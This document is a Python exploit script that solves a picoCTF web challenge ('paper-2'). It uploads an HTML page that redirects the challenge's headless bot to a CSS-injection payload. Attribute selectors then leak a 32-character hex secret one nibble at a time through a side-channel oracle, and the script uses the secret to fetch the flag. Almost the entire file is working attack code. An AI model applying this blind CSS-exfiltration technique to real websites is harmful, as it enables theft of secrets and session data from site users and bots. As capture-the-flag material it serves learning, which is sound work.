#!/usr/bin/env python3
import argparse
import json
import re
import sys
import time
import urllib.parse
from pathlib import Path

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HEX = "0123456789abcdef"


class Paper2Exploit:
    def __init__(self, base_url: str, verify_tls: bool = False, delay_before_probe: float = 4.0):
        self.base = base_url.rstrip("/")
        self.s = requests.Session()
        self.s.verify = verify_tls
        self.delay_before_probe = delay_before_probe

    def _upload_probe_page(self, selectors: list[str]) -> str:
        """
        Upload an HTML file that immediately redirects the bot to /secret
        with a CSS payload. If any selector matches, the bot requests /flag?secret=probe.
        """
        joined = ",".join(f"body{sel}" for sel in selectors)
        css = f"<style>{joined}{{background-image:url('/flag?secret=probe')}}</style>"

        html = (
            "<!doctype html>"
            '<meta charset="utf-8">'
            f'<meta http-equiv="refresh" content="0;url=/secret?payload={urllib.parse.quote(css, safe="")}">'
        )

        files = {
            "file": ("probe.html", html.encode(), "text/html"),
        }

        r = self.s.post(f"{self.base}/upload", files=files, allow_redirects=False, timeout=20)
        if r.status_code not in (302, 303):
            raise RuntimeError(f"Upload failed: {r.status_code} {r.text[:200]!r}")

        location = r.headers.get("Location", "")
        m = re.search(r"/paper/(\d+)", location)
        if not m:
            raise RuntimeError(f"Could not parse uploaded paper id from Location={location!r}")
        return m.group(1)

    def _wait_until_browser_free(self, poll_every: float = 2.0, timeout: float = 120.0) -> None:
        """
        /visit/:id returns 'browser still open!' while the headless browser is busy.
        We probe a nonexistent id; when the browser is free, response becomes 'not found!'.
        """
        start = time.time()
        while True:
            r = self.s.get(f"{self.base}/visit/0", timeout=20)
            text = r.text.strip().lower()
            if "browser still open" not in text:
                return
            if time.time() - start > timeout:
                raise TimeoutError("Timed out waiting for browser to become free")
            time.sleep(poll_every)

    def _trigger_visit(self, paper_id: str) -> None:
        """
        Start the bot on our uploaded page. If browser is still busy, wait and retry.
        """
        while True:
            r = self.s.get(f"{self.base}/visit/{paper_id}", timeout=20)
            txt = r.text.strip().lower()
            if "visiting!" in txt:
                return
            if "browser still open" in txt:
                time.sleep(2.0)
                continue
            raise RuntimeError(f"Unexpected /visit response: {r.status_code} {r.text!r}")

    def _oracle(self, selectors: list[str]) -> bool:
        """
        Returns True if one of the selectors matched the bot's secret.
        Mechanism:
          - bot loads our page, gets redirected to /secret?payload=<style>...</style>
          - if selector matches, browser requests /flag?secret=probe and consumes Redis secret
          - we later request /flag?secret=test
             * 'nice try' => bot already consumed => match
             * 'wrong'    => bot did not consume => no match
        """
        paper_id = self._upload_probe_page(selectors)
        self._wait_until_browser_free()
        self._trigger_visit(paper_id)

        # Give the browser time to load /paper -> redirect -> /secret -> fire CSS request
        time.sleep(self.delay_before_probe)

        r = self.s.get(f"{self.base}/flag?secret=test", timeout=20)
        text = r.text.strip().lower()

        # Whether we got nice try or wrong, the current round's secret is consumed.
        # We still need to wait for the browser to finish sleeping before next round.
        self._wait_until_browser_free(timeout=90.0)

        if "nice try" in text:
            return True
        if "wrong" in text:
            return False

        # Very unlikely here, but if we somehow guessed the exact secret with "test"
        # we'd see picoCTF{...}; treat as weird.
        raise RuntimeError(f"Unexpected /flag probe response: {r.text!r}")

    def recover_secret(self, resume_prefix: str = "", checkpoint_file: str | None = None) -> str:
        """
        Recover the 32-char hex secret using a 4-query binary search per nibble.
        """
        prefix = resume_prefix
        if prefix and not re.fullmatch(r"[0-9a-f]{0,32}", prefix):
            raise ValueError("resume_prefix must be lowercase hex")

        while len(prefix) < 32:
            candidates = list(HEX)

            while len(candidates) > 1:
                mid = len(candidates) // 2
                left = candidates[:mid]
                right = candidates[mid:]

                selectors = [f'[secret^="{prefix + c}"]' for c in left]
                print(f"[*] pos={len(prefix):02d} testing {{{''.join(left)}}} vs {{{''.join(right)}}}", flush=True)

                matched = self._oracle(selectors)
                candidates = left if matched else right

                print(
                    f"[+] pos={len(prefix):02d} branch={'left' if matched else 'right'} -> {''.join(candidates)}",
                    flush=True,
                )

            prefix += candidates[0]
            print(f"[+] secret so far: {prefix}", flush=True)

            if checkpoint_file:
                Path(checkpoint_file).write_text(json.dumps({"prefix": prefix}, indent=2))

        return prefix

    def fetch_flag(self, secret: str) -> str:
        r = self.s.get(f"{self.base}/flag", params={"secret": secret}, timeout=20)
        return r.text.strip()


def main():
    ap = argparse.ArgumentParser(description="paper-2 blind CSS extractor")
    ap.add_argument(
        "--base",
        default="https://lonely-island.picoctf.net:61553",
        help="Base challenge URL, e.g. https://lonely-island.picoctf.net:61553",
    )
    ap.add_argument(
        "--verify",
        action="store_true",
        help="Verify TLS certificates (disabled by default for local docker/self-signed testing)",
    )
    ap.add_argument(
        "--resume",
        default="",
        help="Resume from a known lowercase-hex prefix",
    )
    ap.add_argument(
        "--checkpoint",
        default="paper2_checkpoint.json",
        help="Checkpoint file to save progress after each nibble",
    )
    ap.add_argument(
        "--delay",
        type=float,
        default=4.0,
        help="Seconds to wait before probing /flag after triggering the bot",
    )
    args = ap.parse_args()

    # Resume from checkpoint if present and explicit --resume not provided
    resume = args.resume
    cp = Path(args.checkpoint)
    if not resume and cp.exists():
        try:
            data = json.loads(cp.read_text())
            resume = data.get("prefix", "")
            if resume:
                print(f"[*] Resuming from checkpoint: {resume}")
        except Exception:
            pass

    exp = Paper2Exploit(args.base, verify_tls=args.verify, delay_before_probe=args.delay)

    secret = exp.recover_secret(resume_prefix=resume, checkpoint_file=args.checkpoint)
    print(f"[+] Recovered secret: {secret}")

    flag = exp.fetch_flag(secret)
    print(f"[+] Final response: {flag}")

    m = re.search(r"(picoCTF\{[^}]+\})", flag)
    if m:
        print(f"[+] FLAG: {m.group(1)}")
    else:
        print("[!] Flag regex not found in final response; raw response printed above.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        sys.exit(1)
